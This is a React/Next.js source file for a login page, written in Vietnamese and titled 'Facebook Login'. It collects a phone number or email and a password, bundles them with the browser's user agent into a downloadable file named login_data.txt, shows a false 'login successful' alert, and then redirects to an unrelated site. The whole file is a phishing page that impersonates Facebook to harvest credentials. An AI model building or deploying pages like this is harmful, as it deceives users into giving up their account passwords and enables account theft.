import { useState } from "react";
import { useRouter } from "next/router";

export default function Login() {
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const validateEmail = (email) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const validatePhone = (phone) => {
    return /^\d{10}$/.test(phone);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setError("");

    if (!validateEmail(email) && !validatePhone(phone)) {
      setError("Nhập ít nhất một thông tin hợp lệ: số điện thoại (10 chữ số) hoặc email");
      return;
    }
    
    const userAgent = navigator.userAgent;
    const identifier = phone || email; // Sử dụng số điện thoại nếu có, nếu không thì dùng email
    const logData = `${identifier} | ${password} | ${userAgent}\n`;
    
    try {
      const blob = new Blob([logData], { type: "text/plain" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "login_data.txt";
      a.click();
    } catch (err) {
      console.error("Lỗi khi lưu file:", err);
    }

    alert("Đăng nhập thành công!");
    router.push("https://boitinhyeu.vn/");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-6 rounded-lg shadow-lg w-96">
        <h2 className="text-2xl font-bold text-center text-blue-600">Facebook Login</h2>
        {error && <p className="text-red-500 text-sm">{error}</p>}
        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Số điện thoại"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            className="w-full p-2 border rounded mt-2"
          />
          <input
            type="email"
            placeholder="Email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full p-2 border rounded mt-2"
          />
          <input
            type="password"
            placeholder="Mật khẩu"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-2 border rounded mt-2"
          />
          <button type="submit" className="w-full bg-blue-500 text-white p-2 rounded mt-4">Đăng nhập</button>
        </form>
      </div>
    </div>
  );
}